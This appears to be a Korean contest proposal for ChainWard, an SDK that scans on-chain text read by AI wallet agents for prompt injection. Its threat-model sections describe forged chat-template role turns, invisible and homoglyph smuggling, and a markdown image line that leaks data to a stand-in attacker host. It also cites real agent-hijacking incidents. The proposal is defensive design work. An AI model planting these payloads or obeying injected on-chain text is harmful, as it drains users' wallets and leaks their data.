# ChainWard — 프로젝트 기획서

> 온체인 AI 에이전트 입력 무결성 가드 SDK
> 2026 오픈소스 개발자대회 · 자유과제(블록체인 / 보안·안전)
> 문서 버전 v2 · 2026-07-11

---

## 1. 한 문단 요약

**ChainWard는 온체인 AI 에이전트가 읽는 "공격자-쓰기가능 온체인 데이터"(토큰명·NFT 메타데이터·트랜잭션 memo 등)가, LLM이나 브라우저의 해석 환경에서 정보/주석에서 명령/구조로 뒤집히는(parser-differential) 페이로드를, 데이터가 모델에 닿기 전 길목에서 차등 해석으로 탐지·정화하는 오픈소스 SDK다.** 블록체인 데이터는 불변이라 사후에 고칠 수 없으므로 방어는 반드시 "읽는 시점"에 이뤄져야 하며, ChainWard는 개발자가 직접 만든 하네스(ElizaOS 등)에는 라이브러리로, 통제권이 제한된 범용 하네스(Claude Code 등)에는 로컬 프록시로 선택 삽입된다.

---

## 2. 배경 — 온체인 AI 에이전트는 왜 온체인 데이터를 읽는가

### 2.1 에이전트의 부상
자율 AI 에이전트가 지갑을 쥐고 온체인에서 판단·거래하는 시대가 열렸다(ElizaOS, Virtuals, Bankr, aixbt 등). ElizaOS 하나만 해도 프레임워크가 관리하는 자산이 $25M을 넘는다(arXiv 2503.16248). 이들은 공통적으로 **온체인 데이터를 읽어 판단하고 지갑을 움직인다.**

### 2.2 무슨 데이터를, 왜 읽는가
온체인 데이터는 에이전트가 다루는 "세계" 그 자체다. 토큰이 무엇인지, NFT가 무엇인지, 지갑에 무엇이 있는지를 아는 **유일한 통로**가 온체인 필드다.

| 에이전트 종류 | 읽는 데이터 | 왜 |
|---|---|---|
| 트레이딩 봇 | 토큰 name/symbol/메타, 가격·유동성 | "이 토큰 뭐지, 살까?" 판단 |
| 지갑 어시스턴트 | 잔고 + 각 토큰 name/symbol | "내 지갑 뭐 있어?" 응답 |
| NFT 에이전트 | NFT name/description/traits | 평가·큐레이션·가격 산정 |
| 포트폴리오/분석 | 토큰명·tx history·memo | 요약·리포트 |
| 거버넌스 | 온체인 제안 텍스트 | 투표 판단 |
| DeFi/에어드랍 | 컨트랙트 상태·자격 기록 | 실행 조건 확인 |

### 2.3 어떻게 해석·활용하는가
읽은 온체인 텍스트는 **자연어처럼 에이전트의 LLM 컨텍스트로 들어가** 판단(intent)을 형성한다. 예: "0x… 살까?" → 에이전트가 `name()/symbol()/tokenURI`를 읽어 컨텍스트에 넣음 → LLM이 그 텍스트를 근거로 "안전/위험, 매수/회피"를 결정 → 지갑 액션(swap/approve/transfer) 실행. **즉 온체인 텍스트가 곧 에이전트의 입력이 된다.**

---

## 3. 문제제기

### 3.1 온체인 필드 = 공격자-쓰기가능 표면
토큰명·심볼·NFT 메타데이터·memo는 전부 **누구나 배포 시 임의 문자열로 채울 수 있는** 자유 텍스트다. 공격자는 여기에 인젝션 페이로드를 심을 수 있다.

### 3.2 핵심 메커니즘 — 환경 불일치(parser-differential)
이 문제는 40년 된 injection 계보(SQLi·CSV formula·Log4Shell·SSTI·Trojan Source)의 최신판이다. 한 문장:

> **문자열은 지금 읽는 파서 기준으로만 데이터냐 명령이냐가 정해진다. 바이트는 안 변한다 — 읽는 환경만 변한다.**

온체인 텍스트는 작성 환경(A)에서는 정보/주석(inert)이지만, LLM의 chat-template 환경이나 브라우저의 markdown 렌더 환경(B)에서는 명령/구조(control)로 재해석된다. 예:
- NFT description의 `### System:` 또는 `<|im_start|>` — 평문 저장 시 무해하나, 하네스가 모델 프롬프트로 템플릿할 때 **가짜 시스템 턴을 위조**한다.
- memo의 `![](https://attacker/?leak=…)` — 저장 텍스트로는 무해하나, 챗 UI가 markdown 렌더 시 **브라우저가 자동 fetch → 데이터 유출**.
- 토큰명의 invisible Tag-block/homoglyph — 사람 눈엔 정상, tokenizer엔 다른 명령.

### 3.3 우리가 막을 타겟의 경계
- **막는다:** ① 대놓고 인젝션 페이로드 ② 환경-불일치 페이로드 ③ invisible/구조/인코딩 밀반입 ④ **온체인 진실로 반박되는 거짓 주장**(§7 L3).
- **못 막는다(정직):** 검증 불가능한 주관적 거짓말("믿어, 곧 100배" — 지상 진실 없음), 데이터 채널 밖 공격(키 탈취·에이전트 자기 툴 오염·권한 객체), 적응형 패러프레이즈 100%.

### 3.4 실증된 인접 사례 (reachability≠impact)
오염된 *온체인 필드*로 인한 실제 손실은 아직 관측되지 않았다(선제 방어 영역). 그러나 동일 메커니즘의 실사례가 풍부하다: EchoLeak(M365 Copilot, CVE-2025-32711), ElizaOS 메모리주입(arXiv 2503.16248, testnet 온체인 데모), Zscaler 라이브 캠페인, boannews 에이전트재킹(Tenet), Bunq memo 공격, Grok/Bankr($150k). ChainWard는 이 실증 기법들을 온체인 필드로 옮긴 **예방 계층**이다.

### 3.5 왜 "읽는 시점" 방어가 필연인가
온체인 데이터는 **불변**이다. 악성 NFT/토큰을 배포 후 삭제·수정할 수 없다. 배포자 주소를 추적할 수는 있으나 공격자는 새 주소를 거의 공짜로 무한 생성하므로 주소 blocklist는 약하다. 따라서 **체인을 고치는 방어는 불가능**하고, 유일한 지점은 **에이전트가 그 데이터를 읽어 모델에 넣기 직전의 정화**다. 이것이 ChainWard의 위치를 정당화한다.

---

## 4. 위협 모델

| 항목 | 내용 |
|---|---|
| **자산** | 에이전트의 지갑 자금, 에이전트의 판단 무결성 |
| **공격자** | 임의 토큰/NFT를 배포하거나 memo를 보낼 수 있는 누구나(퍼미션리스) |
| **공격 벡터** | 온체인 텍스트 필드(name/symbol/tokenURI/attributes/memo/컨트랙트 텍스트/ENS 텍스트) |
| **트리거** | 에이전트가 그 필드를 읽어 LLM 컨텍스트에 넣는 순간 |
| **피해** | 하이재킹된 판단 → 자금 유출(transfer/approve), 오조언, 데이터 유출 |
| **신뢰 경계** | "온체인 데이터"는 항상 신뢰불가로 취급. 에이전트의 시스템 프롬프트만 신뢰 |

---

## 5. 해결 방안 — ChainWard 개요

데이터가 반드시 지나는 길목(에이전트의 읽기→LLM 사이)에 앉아, 각 온체인 텍스트를 **차등 해석**으로 스캔하고, 위험 구조를 제거/격리한 **모델-안전 렌더링**만 통과시킨다. 개발자는 통제권 수준에 따라 라이브러리 또는 프록시로 삽입한다.

---

## 6. 아키텍처 — 구간별

```
[온체인/외부 소스] → (읽기) → [Host: 프롬프트 조립] → [LLM 모델] → [Action/Wallet]
                                    ▲
                       ChainWard 가드가 여기(모델 前)
```

| 구간 | 만드는 것 | 해결 |
|---|---|---|
| ① 온체인 read | 데이터소스 어댑터(viem RPC) | 공격 표면에서 원본 데이터 획득 |
| ② 가로채기 | 라이브러리 `guard()` / 프록시 / MCP 툴 | 데이터가 지나는 길목 장악(모델 前) |
| ③ 엔진 | 5계층 차등 해석 파이프라인 | 위험 구조 탐지 |
| ④ 정화 | 모델-안전 렌더 | 오염 제거·격리 후 통과 |
| ⑤ 패키징 | SDK + 인스펙터 UI | 선택 삽입 + 시각적 증거 |

---

## 7. 엔진 상세 (5계층)

핵심 아이디어: **평문(inert) vs 소비 환경(실제 파서)로 두 번 해석 → 불일치를 flag.**

- **L1 구조 이상** (구현됨) — Unicode 정규화, invisible/Tag-block/bidi/zero-width, homoglyph·혼합 스크립트, base64/hex/Morse 디코드. "눈 vs tokenizer" 차등. FP≈0, 최강 신호.
- **L2 패턴 + 분류기** (구현됨) — 명령형·역할위조·approve-lure 패턴팩 + 경량 인젝션 분류기(Llama Prompt Guard 2 교체 가능).
- **L3 온체인 진실 검증기** (확장) — 텍스트의 주장("official USDC", "audited", "renounced", "no tax", "safe")을 추출 → **온체인 사실과 대조**(토큰 정체성 레지스트리, 소유권/proxy 상태, 홀더/유동성, honeypot 행동 via GoPlus). 모순 = 기만 flag. **마커 없는 거짓말도 진실이 반박하면 잡힌다** — web3 스코프의 결정적 차별점.
- **L4 차등 해석기** (신설, 심장) — 선언된 소비 환경별 실제 파서로 해석:
  - **LLM chat-template 해석기:** 데이터를 해당 모델 template에 넣어 `<|im_start|>`·`[INST]`·`<<SYS>>`·`### System` 등 **역할턴 위조/특수토큰** 탐지(template은 결정적).
  - **markdown 해석기:** AST 파싱 → 이미지-유출 `![](url?leak=)`·`javascript:`·raw `<script>` 등 **렌더 시 실행/유출** 노드 탐지.
- **L5 판정·정화** (구현됨) — 신호 융합(hard 신호→MALICIOUS, 아니면 가중 soft-OR 임계) → CLEAN/SUSPICIOUS/MALICIOUS + 모델-안전 렌더(invisible 제거·homoglyph fold·NFKC, 위험은 redact/격리).

**reader-aware:** `scanField(kind, text, {targetContext, model})`. 입력측 환경(모델 template)은 요청의 `model`로 자동 감지, 출력측 환경(markdown-ui 등)은 개발자가 선언.

**FP 규율:** 진실로 반박되는 것만 flag. 추측으로 "거짓 같다" flag 금지. 검증 가능 거짓 = 저-FP, 일반 NL 거짓말 탐지 = 고-FP라 안 함.

---

## 8. 통합 · 배포 (SDK)

한 npm 패키지/GitHub 레포에 두 진입점 + 공유 엔진:

| 진입점 | 대상 | 사용 | 우선 |
|---|---|---|---|
| 라이브러리 `guard()` | ElizaOS·자작(코드 소유) | `messages = await guard(messages, {model})` 하네스↔LLM 한 줄 | 주력 |
| 프록시 데몬 | Claude Code·범용(통제 제한) | `npx chainward proxy` + `ANTHROPIC_BASE_URL` 스왑, 코드 0 | 주력 |
| MCP 툴 | 온디맨드 | "이 토큰 스캔해줘" | 보조 |

- **인스펙터 UI**(opt-in `--inspect`): 로컬 웹에 탐지/정화/before-after 실시간 표시. 대회 3분 시연용.
- 라이선스 MIT, 의존성 MIT/Apache(viem, MCP SDK, transformers).

---

## 9. 스코프 · 경계 (정직)

- **스코프:** 엔진 메커니즘은 범용(parser-differential)이나 제품·데모는 **web3 한정**(온체인 데이터 + intent layer). 범용화는 소비 환경마다 방법론이 달라 6주 내 불가 + 기존 범용 가드(Lakera 등)와 차별화 소멸 → 배제.
- **소비 환경 2개만 깊게:** LLM chat-template(주력) + markdown/browser UI.
- **은탄환 아님:** 실측 기법엔 거의 완벽, 미탐지분도 정화로 격리(다층 방어). 선제 방어이며 공격자 비용을 크게 올리는 계층.

---

## 10. 차별점 (기존 도구 대비)

| 도구 | 무엇 | 못 하는 것 |
|---|---|---|
| GoPlus AgentGuard | 스킬/MCP/프롬프트 인젝션 탐지 | 온체인 데이터 필드 미검사 |
| GoPlus/Blockaid 토큰분석 | 컨트랙트 *행동*(honeypot) | 텍스트 인젝션·주장 대조 미검사 |
| Lakera/Prompt Guard | 범용 프롬프트 인젝션 | web3 인식 0, 온체인 진실 검증 불가 |
| **ChainWard** | 온체인 필드 × 차등해석 × 온체인-진실 대조 | (범용 NL 거짓말은 범위 밖 — 정직) |

**결정적 차별:** 범용 가드는 "지상 진실"이 없어 검증 가능 거짓을 못 잡지만, ChainWard는 온체인 사실과 대조해 잡는다.

---

## 11. 데모 · 검증

- `agent-sim` (ElizaOS 지갑-어시스턴트 루프): 가드 OFF → 하이재킹(자금 유출)/오조언, ON → 차단. (동작 확인됨)
- 유닛 테스트 + MCP 실제 stdio 핸드셰이크(동작 확인됨).
- 결과보고서용 미니 벤치마크: 온체인 인젝션 코퍼스로 "순정 X% 하이재킹 → 가드 Y% 차단" 정량화.

---

## 12. 로드맵 (6주, 7/23 오리엔테이션 ~ 8/27 제출)

| 주차 | 목표 |
|---|---|
| 1 | 엔진 정비 + `targetContext`/reader-aware 골격 |
| 2 | L4 LLM chat-template 차등해석기 |
| 3 | L4 markdown 해석기 + L3 온체인 진실 검증기 확장 |
| 4 | SDK 정리(라이브러리 export + `chainward proxy`) |
| 5 | 인스펙터 UI + agent-sim/데모 시나리오 + 미니 벤치마크 |
| 6 | 폴리시·문서·README·시연영상·결과보고서 |

---

## 13. 대회 정합 · 라이선스

제출물 3종(소스코드·결과보고서·3분 시연영상) 커버. 2차 기능테스트=CLI/프록시/라이브러리 실행 검증 가능. 라이선스 검증=MIT + MIT/Apache 의존성. 자유과제 블록체인·보안·안전 해당.

---

## 14. 근거 레퍼럴

arXiv 2503.16248(ElizaOS 메모리주입), Zscaler ThreatLabz(라이브 캠페인), OECD.AI 2026-05-04/SlowMist(Grok·Bankr), EchoLeak(CVE-2025-32711), Trojan Source(CVE-2021-42574/-42694), OWASP Injection A03:2021, LangSec(parser differential), Simon Willison/NCSC(prompt injection ≠ SQLi), GoPlus Token Security API, osscontest.kr 요강.
